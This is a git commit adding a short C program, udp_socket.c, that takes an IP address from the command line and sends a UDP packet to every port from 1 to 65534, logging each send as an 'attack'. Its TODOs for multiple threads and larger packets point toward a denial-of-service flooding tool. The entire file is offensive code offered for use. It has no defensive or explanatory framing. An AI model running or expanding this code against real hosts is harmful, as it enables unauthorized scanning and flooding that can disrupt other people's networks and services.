2514a2467789628efe8a8071bcceff578ca097e7
Cvar1984 <Cvar1984@pm.me>
2023-07-27 12:57:06 +0700

    udp socket

---
+++ udp_socket.c
@@ -0,0 +1,47 @@
+#include <stdio.h>
+#include <stdint.h>
+#include <netdb.h>
+#include <string.h> // strcpy
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h> // close
+
+/** TODO
+ * multi threads
+ * adjust packet size
+*/
+
+int8_t main(int argc, char **argv)
+{
+    int s;
+    uint16_t port;
+    struct sockaddr_in server;
+    char buff[64];
+    strcpy(buff, "Test");
+
+    int8_t send_attack(char *ip) {
+        if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+            // tcperror("socket()");
+            return 1;
+        }
+
+        server.sin_family = AF_INET;
+        server.sin_addr.s_addr = inet_addr(ip);
+
+        for (uint16_t x = 1; x < 65535; x++) { // from 1 to 65535
+            printf("Sending attack: %s:%d\n", ip, x);
+            port = htons(x);
+            server.sin_port = port;
+
+            if (sendto(s, buff, (strlen(buff) + 1), 0, (struct sockaddr *)&server, sizeof(server)) < 0) {
+                // tcperror("sendto()");
+                return 1;
+            }
+        }
+
+        close(s);
+    }
+    send_attack(argv[1]);
+    return 0;
+}
